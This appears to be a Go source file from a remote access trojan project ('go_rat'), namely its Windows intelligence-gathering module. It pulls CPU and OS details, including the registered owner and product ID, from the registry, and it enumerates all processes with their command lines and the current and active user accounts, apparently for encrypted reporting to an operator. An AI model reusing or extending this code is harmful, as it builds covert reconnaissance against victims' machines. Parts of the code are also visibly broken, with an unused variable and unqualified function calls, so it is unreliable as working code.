/*/
This file contains the code only used for collecting intel with
	- WINDOES BINARIES

We are using the feature outlined in :
	- https://golang.org/cmd/go/#hdr-Build_constraints

/*/

package Intel

// import the libraries we need
import ( // necessary for gathering process information
	// necessary for getting netowork information
	// Software information Enumeration
	"go_rat/pkg/shared_code/Core"
	"go_rat/pkg/shared_code/ErrorHandling"
	"io"
	"log"
	"os/user"
	"strconv"

	"github.com/shirou/gopsutil/process"
	"golang.org/x/sys/windows/registry"
)

// GetCPUmodel inserts information about the target system's CPU model
// into a hostintel struct
func GetCPUmodel(intel_struct Core.HostIntel) (derp error) {
	key := `HARDWARE\DESCRIPTION\System\CentralProcessor\0`
	regValue := "Identifier"
	k, derp := registry.OpenKey(registry.LOCAL_MACHINE, key, registry.QUERY_VALUE)
	if derp != nil {
		ErrorHandling.Error_printer(derp, "Generic Error Message Plz Fix! LOL <3 OP SUX")
		return derp
	}
	defer k.Close()

	v, _, derp := k.GetStringValue(regValue)
	if derp != nil {
		Error_printer(derp, "Generic Error Message Plz Fix! LOL <3 OP SUX")
	}
	return derp
}

// GetCPUname returns the target system's CPU name
func GetCPUname() (string, error) {
	key := `HARDWARE\DESCRIPTION\System\CentralProcessor\0`
	regValue := "ProcessorNameString"

	k, derp := registry.OpenKey(registry.LOCAL_MACHINE, key, registry.QUERY_VALUE)
	if derp != nil {
		Error_printer(derp, "Generic Error Message Plz Fix! LOL <3 OP SUX")
	}
	defer k.Close()

	v, _, derp := k.GetStringValue(regValue)
	if derp != nil {
		Error_printer(derp, "Generic Error Message Plz Fix! LOL <3 OP SUX")
	}
	return v, derp
}

// code from:
// https://github.com/bluesentinelsec/OffensiveGoLang/blob/master/pkg/windows/discovery/os.go
// GetOSinfo returns information about the target system OS
// in a struct that must be converted to json and encrypted
func GetOSinfo() (OSInfo, error) {
	var OSInformation OSInfo
	key := `SOFTWARE\Microsoft\Windows NT\CurrentVersion`

	k, derp := registry.OpenKey(registry.LOCAL_MACHINE, key, registry.QUERY_VALUE)
	if derp != nil {
		return OSInformation, derp
	}
	defer k.Close()
	OSInformation.InstallationType, _, _ = k.GetStringValue("InstallationType")
	OSInformation.ProductID, _, _ = k.GetStringValue("ProductId")
	OSInformation.ProductName, _, _ = k.GetStringValue("ProductName")
	OSInformation.RegisteredOwner, _, _ = k.GetStringValue("RegisteredOwner")
	OSInformation.ReleaseID, _, _ = k.GetStringValue("ReleaseId")
	OSInformation.CurrentBuild, _, _ = k.GetStringValue("CurrentBuild")
	// ToDo: convert epoc times to readable format
	OSInformation.InstallDate, _, _ = k.GetIntegerValue("InstallDate")
	OSInformation.InstallTime, _, _ = k.GetIntegerValue("InstallTime")

	return OSInformation, nil
}

// Procs returns a slice of process objects
// Look at "PrintProcSummary()" and "PrintProcDetails()" for examples on displaying the process info
func Procs() ([][]string, error) {
	procs, derp := process.Processes()
	if derp != nil {
		Error_printer(derp, "generic error, fix me plz lol <3!")
	}
	processes := make([][]string, 0)
	for _, ps := range procs {
		// assign each process value to a variable
		i := ps.Pid
		pid := strconv.Itoa(int(i))

		i, _ = ps.Ppid()
		pPid := strconv.Itoa(int(i))

		pName, _ := ps.Name()
		pCmdLine, _ := ps.Cmdline()

		//pCreate, _ := ps.CreateTime()

		pUser, derp := ps.Username()
		if derp != nil {
			pUser = "Access Denied"
		}

		p := make([]string, 0)
		p = append(p, pid, pPid, pName, pCmdLine, pUser)

		// append each process, p, to the processes slice
		processes = append(processes, p)
	}
	return processes, nil
}

// CurrentUser returns the current user
func CurrentUser() ([]map[string]string, error) {
	u, derp := user.Current()
	if derp != nil {
		Error_printer(derp, "generic error, fix me plz lol <3!")
	}

	a := make(map[string]string)
	a["Username: "] = u.Username
	a["SID: "] = u.Uid
	a["Home Directory: "] = u.HomeDir

	userInfo := make([]map[string]string, 0)
	userInfo = append(userInfo, a)

	return userInfo, derp
}

// ActiveUsers returns
func ActiveUsers() []*user.User {
	// query registry key, "HKEY_USERS", to get list of security IDs (SIDs)
	sids := queryRegistrySIDs()

	// parse list of SIDs, looking for those that are 46 characters long, indicating active user accounts
	activeUserSids := parseSIDs(sids)

	// lookup user information for each SID
	activeAccounts := lookupUserAccount(activeUserSids)

	return activeAccounts

}

func queryRegistrySIDs() []string {
	// open registry key, "HKEY_USERS"
	k, derp := registry.OpenKey(registry.USERS, "", registry.ENUMERATE_SUB_KEYS)
	if derp != nil {
		log.Fatal(derp)
	}
	defer k.Close()

	// Read HKEY_USERS subkeys to get user SIDs
	userSIDs, derp := k.ReadSubKeyNames(1024)
	if derp != nil {
		if derp != io.EOF {
			log.Fatal(derp)
		}
	}
	return userSIDs
}

func parseSIDs(sids []string) []string {
	activeUserSIDs := make([]string, 0)
	for _, sid := range sids {
		if len(sid) == 46 {
			// append SID
			activeUserSIDs = append(activeUserSIDs, sid)
		}
	}
	return activeUserSIDs
}

func lookupUserAccount(activeUserSids []string) []*user.User {
	activeUsers := make([]*user.User, 0)
	for _, s := range activeUserSids {
		userInfo, _ := user.LookupId(s)
		activeUsers = append(activeUsers, userInfo)
	}
	return activeUsers
}
